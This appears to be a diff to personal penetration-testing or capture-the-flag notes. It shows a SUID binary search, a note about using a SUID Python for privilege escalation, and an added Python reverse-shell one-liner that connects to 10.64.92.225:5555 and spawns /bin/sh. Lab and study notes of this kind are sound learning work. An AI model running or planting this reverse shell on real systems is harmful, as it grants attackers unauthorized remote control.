@@ -235,4 +235,9 @@ find / -perm -4000 -type f 2>/dev/null
 > [!note]
 > SUID bit binary set for Python so it can be run as root with python scripts for PE righttt???
 
-
+```
+python -c 'import sys,socket,os,pty;s=socket.socket()
+s.connect(("10.64.92.225",5555))
+[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
+pty.spawn("/bin/sh")'
+```
